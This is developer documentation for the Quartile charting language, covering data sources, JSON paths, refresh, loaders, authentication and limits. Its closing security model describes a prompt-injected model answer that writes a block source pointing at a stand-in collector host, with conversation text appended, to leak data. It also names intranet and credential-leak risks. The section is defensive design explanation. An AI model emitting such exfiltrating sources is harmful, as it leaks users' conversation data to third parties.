# Data sources

A Quartile block gets its rows in one of four ways. This page covers each of them, then JSON APIs, live data, the loader for React and for servers, the script-tag allowlist, authentication, limits, error messages and the security model.

| Way | In the block | Who supplies the rows |
|---|---|---|
| [Inline](#1-inline-rows) | rows after `---` | the author, or the model that wrote the block |
| [A `data` block](#2-a-data-block) | `data: name` | another block in the same document |
| [A dataset the app provides](#3-a-dataset-your-app-provides) | `data: name` | your application code |
| [A URL](#4-a-url-the-page-allows) | `src: url` | the page's loader, when the host allows the URL |

The block syntax itself is in the [language reference](../language.md#6-data).

## 1. Inline rows

Rows written after `---` travel with the block. They may be CSV, tab-separated or semicolon-separated text, a Markdown table, or JSON.

```quartile
bar sum(revenue) by region
title: Revenue by region, Q3 2026
format: currency USD
---
region,revenue
EMEA,1200000
APAC,860000
Americas,2100000
```

Values are typed per column: `$1,200`, `12.5%`, `1.2M`, `2026-03` and `2026-Q1` become numbers and dates with a matching display format. A block keeps at most 5,000 inline rows by default. Inline rows suit small, already aggregated data. Rows that a model writes are as reliable as the model.

## 2. A `data` block

A `data` block defines rows once under a name. Other blocks in the same document read them with `data: name`, before or after the definition.

```quartile
data orders
total.format: currency USD
total.description: Order value after discounts.
---
id,region,channel,total
1001,EMEA,Web,129
1002,EMEA,Store,80
1003,APAC,Web,210
1004,Americas,Web,95
1005,Americas,Store,160
```

```quartile
bar sum(total) by region
data: orders
```

Field settings in the `data` block (`total.format`, `total.description`) apply in each block that reads it. Blocks over the same named dataset share one selection: click a bar in one and the others filter.

## 3. A dataset your app provides

Where the numbers matter, run the query in your application, authorize it for the user, and pass the rows by name. The block is the same `data: name` line.

```tsx
<QuartileDocument data={{ orders: rowsTheUserMayRead }} pending={loading ? ['orders'] : []}>
  {children}
</QuartileDocument>
```

```quartile
kpi sum(total) as "Revenue"
data: orders
```

On this page the rows come from the `data` block in section 2. In your app they come from the `data` prop, and the block does not change.

- `pending` names datasets that are still loading. Blocks over them show a placeholder instead of an error.
- The static renderers take the same rows as `datasets: { orders }`. See [server rendering](server-rendering.md).
- A name in `data` wins over a `data` block or a `src:` with the same name, and nothing is fetched for it.
- `quartilePrompt({ datasets })` tells a model which names and columns exist, so it writes `data: orders` instead of pasting rows. See [charts in AI answers](ai-responses.md).

## 4. A URL the page allows

`src:` names a URL. `url:` is the same setting. Do not confuse it with `source:`, which loads nothing: it is a line of text that tells the reader [where the numbers came from](interaction.md#5-where-the-numbers-came-from).

```text
bar sum(revenue) by region
src: data/sales.csv
```

The block only names the URL. Whether it is fetched, from which origins and with which headers is decided by the page that renders the block (sections 7 to 10). On a page that has not opted in, the block shows "This chart has no data" with the message `This page does not load remote data (data/sales.csv).` and its source.

- The response may be CSV, TSV, a Markdown table or JSON. It is read like inline rows.
- A relative URL resolves against the page. On a server it resolves against the loader's `base`.
- In a `data` block, the loaded rows are registered under the block's name, so several blocks read one request:

```text
data orders
src: /api/orders.json
path: orders
refresh: 30s
total.format: currency USD
```

- In a `dashboard` block, write `src:`, `path:` and `refresh:` before the first view. The views share the loaded rows.
- In a browser, blocks that name the same URL share one request.

## 5. JSON APIs and `path:`

An API seldom answers with a bare list. This response wraps its rows in two levels and adds metadata:

```json
{
  "status": "ok",
  "data": {
    "results": [
      { "day": "2026-11-03", "visitors": 1840 },
      { "day": "2026-11-04", "visitors": 2015 },
      { "day": "2026-11-05", "visitors": 1962 }
    ],
    "next_cursor": null
  },
  "meta": { "request_id": "req_8f2c" }
}
```

`path:` says where the rows are:

```text
line sum(visitors) by day
title: Visitors, last 7 days
src: https://api.example.com/v1/analytics/visitors?range=7d
path: data.results
refresh: 5m
```

A path is keys and list positions separated by dots: `data.results`, `results.0.series`. Positions start at 0. `rowspath`, `datapath` and `jsonpath` are other names for the setting.

`path:` also applies to JSON written inline:

```quartile
bar sum(revenue) by region
title: Revenue by region
path: data.items
---
{"status": "ok", "data": {"items": [{"region": "EMEA", "revenue": 1200000}, {"region": "APAC", "revenue": 860000}], "total": 2}}
```

**Other spellings.** The JSONPath forms of the same lookup are read, with a note that gives the dotted form: `$.data.items`, `results[0].series`, `data['items']`, `$["results"][1]["series"]`. `$` alone means the whole document.

**Not a query language.** A path selects one place. Wildcards (`*`), recursive descent (`..`), filters, slices, unions and negative positions are errors: `` `$.data[*]` is not a path this language reads. `` A leading dot as jq writes it (`.data.items`) is an error whose hint gives the form to write. A block therefore cannot compute over a response or search it.

**What the path may end at.** A list of objects, a list of arrays whose first array is the header, an object of equal-length column arrays, or an object that holds one of those under the rules below.

### Without a path

Common shapes are read without a setting. Each choice is reported as a note, for example ``Read rows from `data`. ``

| The JSON is | Rows come from |
|---|---|
| a list of objects | the list |
| a list of arrays | the arrays after the first, which is the header |
| an object of equal-length arrays of plain values | the arrays, as columns |
| an object in which one key holds a list of rows, beside metadata | that key |
| an object in which several keys hold lists of rows | the key named `rows`, `data`, `results`, `items` or `records` (first match in that order, any letter case), when it holds objects |
| a list of bare arrays beside a key named `columns`, `cols`, `fields` or `schema` | the arrays, named by that key |

```quartile
donut sum(tickets) by priority
---
{"data": [{"priority": "Urgent", "tickets": 14}, {"priority": "Normal", "tickets": 52}], "meta": {"page": 1}}
```

Column names beside bare arrays may be strings or objects with a `name`. They are used when there are exactly as many names as the first array has values, and the block gets a second note, ``Read column names from `columns`. `` This covers responses shaped as `{ "columns": [...], "rows": [[...]] }` and pandas `orient="split"` output:

```quartile
bar sum(revenue) by region
---
{"columns": ["region", "revenue"], "index": [0, 1], "data": [["EMEA", 1200000], ["APAC", 860000]]}
```

A conventionally named key that is an empty list is read as no rows; a neighbouring list such as `errors` is not charted in its place.

When no rule applies, the block does not guess. It reports what it found:

- ``Several keys hold rows: `current`, `previous`. Choose one with `path:`, e.g. `path: current`.``
- ``Expected an array of rows or an object of columns. This object has the keys `status`, `result`. Name the one that holds the rows with `path:`, e.g. `path: data.items`.``

### When a path does not resolve

The error names the first segment that is missing and what exists at that level:

- ``The path `data.itemz.0` stops at `itemz`: there is no such key at `data`. Keys there: `items`, `total`.``
- ``The path `results.5.series` stops at `5`: `results` has 2 items. Positions run from 0 to 1.``
- ``The path `data.items.region` stops at `region`: `data.items` is a list, which takes a position, not a key.``
- `` `data.total` does not hold rows. Expected an array of rows or an object of columns. ``

A `path:` on CSV or a Markdown table is ignored with a warning. So is a `path:` in a block that has neither `src:` nor inline JSON.

## 6. Live data and `refresh:`

`refresh:` reloads a block's `src:` on a timer.

```text
kpi sum(total) as "Revenue today"
src: /api/orders/today.json
path: orders
refresh: 30s
```

- **Values.** `30s`, `5m`, `1h`, or a number of seconds (`90`). `off`, `no` or `0` switch it off.
- **Floor.** The host sets the shortest interval a block may ask for: 10 seconds by default. A shorter value is raised to the floor, with a note: `Refresh raised from 2s to 10s, the shortest interval this page allows.` Set the floor with `QuartileDocument minRefresh` or `data-min-refresh` on the script. It cannot go below 1 second.
- **Visible pages only.** Timers stop while the page is hidden. When it is shown again, an overdue source reloads at once.
- **No overlap.** One request per URL runs at a time. When several mounted blocks name a URL, the shortest of their intervals is used.
- **Failures keep the last rows.** When a reload fails, the chart keeps the rows it has and tries again at the next interval. A source that has never loaded shows the error. A reload that answers with no rows is not a failure: the views show their empty state.
- **It stops with the block.** Reloading stops when no mounted block uses the source.
- `refresh:` on a block with inline rows or with `data: name` is ignored with a warning. Write it in the block that has `src:`.
- Static output has no timers. The server renderers load a source once.

To reload on demand, call `reload()`. It fetches the sources in use again, or those of one URL, and keeps the current rows on screen until the new ones arrive.

```tsx
const doc = useRef<QuartileDocumentHandle>(null);
// later: await doc.current?.reload();  or  doc.current?.reload('/api/orders/today.json');
<QuartileDocument ref={doc} loadSource={loadSource}>{children}</QuartileDocument>
```

On a page with the script: `Quartile.reload()` or `Quartile.reload('/api/orders/today.json')`.

## 7. The loader for React

`QuartileDocument` fetches nothing by default. Give it a `loadSource` function to opt in. `createSourceLoader` builds one that reads only the origins you list:

```tsx
import Markdown from 'react-markdown';
import { createSourceLoader, QuartileDocument, QuartilePre } from '@quartile/react';
import '@quartile/react/styles.css';

const loadSource = createSourceLoader({
  origins: ['same-origin', 'https://api.example.com'],
});

export function Report({ markdown }: { markdown: string }) {
  return (
    <QuartileDocument markdown={markdown} loadSource={loadSource} minRefresh={30}>
      <Markdown components={{ pre: QuartilePre }}>{markdown}</Markdown>
    </QuartileDocument>
  );
}
```

Create the loader once, outside the component. `createSourceLoader` is exported from `@quartile/react` and from `@quartile/react/lang`. Two more props of the document apply to loaded data: `minRefresh`, the shortest `refresh:` interval in seconds, and `maxRows`, the rows kept from a response (5,000 by default).

| Option | Meaning | Default |
|---|---|---|
| `origins` | Exact origins the loader may read: a scheme, a host and a port when it is not the default (`https://api.example.com`, `http://localhost:8787`). `'same-origin'` allows the page's own origin. | required |
| `base` | Resolves relative URLs. | the page's URL in a browser; none on a server |
| `headers` | Request headers, as an object or a function of the URL. See [authentication](#10-authentication). | none |
| `maxBytes` | Largest response body read. | 5,000,000 |
| `timeoutMs` | Time allowed for the whole response. | 15,000 |
| `fetch` | The fetch implementation. | the global `fetch` |

An entry that is not an exact origin (a wildcard, a path, a scheme other than http or https) makes `createSourceLoader` throw when it is called, so a mistake in the list does not widen it.

You can also write the function yourself. It receives the URL as written in the block and an `AbortSignal`, and returns rows, a dataset, CSV or JSON text, or parsed JSON. A block's `path:` is applied to text and to parsed JSON.

```tsx
<QuartileDocument
  loadSource={async (url, signal) => {
    const res = await fetch(`/api/charts?source=${encodeURIComponent(url)}`, { signal });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return res.json();
  }}
>
  {children}
</QuartileDocument>
```

Here the block's `src:` is a name that your own API route maps to an authorized query, for example `src: orders-by-region`. A loader you write is responsible for its own checks.

## 8. The loader on a server

`remarkQuartile` and `renderMarkdownBlocks` accept the same kind of function and load each source once, at build or request time. `createSourceLoader` works in Node; give it a `base` if blocks use relative URLs.

```ts
import { readFile } from 'node:fs/promises';
import { resolve, sep } from 'node:path';
import { createSourceLoader } from '@quartile/react/lang';
import { renderMarkdownBlocks } from '@quartile/react/server';

const remote = createSourceLoader({
  origins: ['https://api.example.com'],
  headers: { Authorization: `Bearer ${process.env.ANALYTICS_TOKEN}` },
});
const dataDir = resolve('content/data');

// http(s) URLs go through the allowlist; other names are files in one folder.
async function loadSource(url: string) {
  if (/^https?:/i.test(url)) return remote(url);
  const file = resolve(dataDir, url);
  if (!file.startsWith(dataDir + sep)) throw new Error(`${url} is outside the data folder.`);
  return readFile(file, 'utf8');
}

const markdown = await readFile('content/report.md', 'utf8');
const blocks = await renderMarkdownBlocks(markdown, { loadSource, timeZone: 'UTC' });
```

- `'same-origin'` has a meaning only where there is a page. On a server, list origins.
- A source that cannot be read stops the render with `Could not read <url>: <reason>`, so a build does not publish an empty chart.
- `markdownItQuartile` renders synchronously and cannot load. Load the rows first and pass them as `datasets`.
- These functions run in Node build scripts and Markdown pipelines, not inside React Server Components. See [server rendering](server-rendering.md#react-and-nextjs).

## 9. The script tag

The script fetches nothing by default. `data-sources` lists what `src:` may read:

```html
<script
  src="/assets/quartile.global.js"
  data-sources="same-origin https://api.example.com"
  data-min-refresh="30"
></script>
```

| Value | Allows |
|---|---|
| `none` (default) | nothing |
| `same-origin` | the page's own origin, for example `src: data/sales.csv` next to a docs page |
| an exact origin | that origin: scheme, host and port, such as `https://api.example.com` |

Separate values with spaces or commas. There are no wildcards. A value that is not `none`, `same-origin` or an exact http(s) origin is ignored with a console warning; it never widens the list.

The same settings from JavaScript, before the script loads or afterwards:

```html
<script>
  window.QuartileConfig = { sources: 'same-origin https://api.example.com', minRefresh: 30 };
</script>
<script src="/assets/quartile.global.js"></script>
<script>
  Quartile.configure({ maxBytes: 1000000, timeoutMs: 8000 });
  document.querySelector('#refresh').addEventListener('click', () => Quartile.reload());
</script>
```

`Quartile.configure` takes `sources` (a string, a list, or a function `(url: URL) => boolean`), `minRefresh` (seconds), `maxBytes`, `timeoutMs`, `maxRows`, and `loadSource`, which replaces fetching with your own function as in section 7. Applications that import `@quartile/react/embed` call `configureEmbed` with the same options and `pageScope().reload()`.

Sources are loaded once per page and shared by the elements on it. With the script, a loaded source keeps up to 50,000 rows.

## 10. Authentication

A block cannot add, name or change a request header. Headers come from host code:

```ts
const loadSource = createSourceLoader({
  origins: ['https://api.example.com'],
  headers: (url) => ({ Authorization: `Bearer ${tokenFor(url)}` }),
});
```

- A request that carries `headers` does not follow redirects, so an allowed origin cannot pass your headers on to another one.
- Cookies and HTTP credentials are sent to the page's own origin only. Requests to other origins omit them.
- Code that runs in a browser is readable by the people who load the page. Do not put a secret API key in a loader that ships to the browser. Use a same-origin route in your app that adds the key on the server, or load the rows on the server and pass them as a dataset (section 3).
- The script has no `headers` setting. For authenticated data on a plain page, set `Quartile.configure({ loadSource })` to a function that calls your own endpoint, or allow `same-origin` and let your session cookie authorize the request.

## 11. Limits and error messages

| Limit | Value | Change it with |
|---|---|---|
| Response size | 5,000,000 bytes | `maxBytes` |
| Response time | 15 seconds | `timeoutMs` |
| Shortest `refresh:` | 10 seconds | `minRefresh`, `data-min-refresh` |
| Inline rows per block | 5,000 | `maxRows` when you call `compileBlock` yourself; fixed in the components |
| Rows kept from a loaded response | 5,000 in a React document and in the server renderers; 50,000 with the script | `maxRows` on `QuartileDocument`, in the server renderers' options, or in `Quartile.configure` |
| Schemes | `http:` and `https:` | not configurable |

**More rows than the limit.** The first rows are kept, and each view drawn from them says so under the chart: "Showing the first 5,000 of 5,200 rows." The host also receives a warning through `onDiagnostics`. A chart of the first rows is not a chart of the data, so aggregate large data before charting it, or raise `maxRows`. Rows or a dataset that your own loader returns are passed through as they are.

**No rows.** An answer with no rows is not an error. It may be an empty list, an envelope around no rows, or a CSV header with nothing under it. Each view draws its empty state: a chart shows "No data to show" under its title, a KPI its label, a table its columns with "No rows to show". When a later `refresh:` brings rows, the views fill in.

**One problem, one message.** When the data cannot be read, for example because a `path:` does not resolve, the block shows that one error. It does not also report each field as missing.

A block whose source fails shows "This chart has no data", the message and its source text. The messages:

| Message | Meaning |
|---|---|
| `This page does not load remote data (<url>).` | The host supplied no loader and no allowlist. |
| ``This page allows data from: same-origin, https://api.example.com; `https://other.example` is not allowed.`` | The URL's origin is not on the list. No request was made. On a server the sentence starts with "This loader". |
| ``Only http: and https: URLs are loaded; `file:` is not allowed.`` | Another scheme. |
| `HTTP 404` | The server answered with an error status. |
| `The response is larger than 5,000,000 bytes.` | Over `maxBytes`, by its declared length or while reading. |
| `No response within 15 s.` | Over `timeoutMs`. The request was aborted. |
| `The request failed. Another origin must allow this page to read it (CORS).` | The network request failed. In a browser, a cross-origin API must send CORS headers for your page. |
| ``The request was redirected to `https://cdn.example`, which is not allowed.`` | A redirect left the allowlist. |
| `` `data/x.csv` is a relative URL and there is no page or `base` to resolve it against. `` | A relative URL on a server without `base`. |

Loader errors are prefixed with `Could not load <url>:` in the block. A failed source is tried again when a block asks for it after a short wait, and at each `refresh:` interval.

## 12. Security model

Blocks are text. They may be written by a colleague, pasted from a website, or produced by a model that read untrusted input. The design assumes a block can be hostile.

**A block can name a URL. It cannot make the page fetch it.** Nothing is requested unless the host supplies a loader or an allowlist, and the default is none. The reasons:

- **Data leaving the page.** A prompt-injected answer could write `src: https://collector.example/?q=` followed by text from the conversation. If the page fetched that, the text would be sent to a stranger.
- **Requests on the reader's behalf.** A page that fetches what a block names could be pointed at an intranet address, or at another site with the reader's cookies.
- **Borrowed credentials.** A header your loader adds for one API must not reach another host.

What the packaged loader and the script do about it:

- Origins are matched exactly: scheme, host and port. There are no wildcards, and an entry that is not an exact origin is rejected.
- Only `http:` and `https:` URLs are loaded.
- Cookies are sent to the page's own origin only.
- A response that was redirected to an origin outside the list is refused. A request with host headers does not follow redirects.
- Responses are limited in size and time, and `refresh:` has a floor, so a block cannot make a page poll rapidly or read an unbounded body.
- `path:` is a lookup. It reads own keys only and has no wildcards, filters or expressions.
- Loaded text is parsed as data. It is never run or inserted as HTML.

What stays your decision:

- An allowlist limits the origin, not the path or the query. An allowed origin receives whatever path and query a block writes. On pages that show model output or user-written blocks, allow only origins where a GET request with an arbitrary path is harmless, and prefer `same-origin` or a dataset your app provides.
- A `loadSource` function you write runs with your code's privileges. Check the URL against your own list inside it.
- A chart that loads and validates can still answer the wrong question. Keep row grain, units and denominators explicit.

The language's other safety properties (no scripts, HTML or SQL in blocks, a closed list of colors, checked source links) are in the [language reference](../language.md#12-safety).
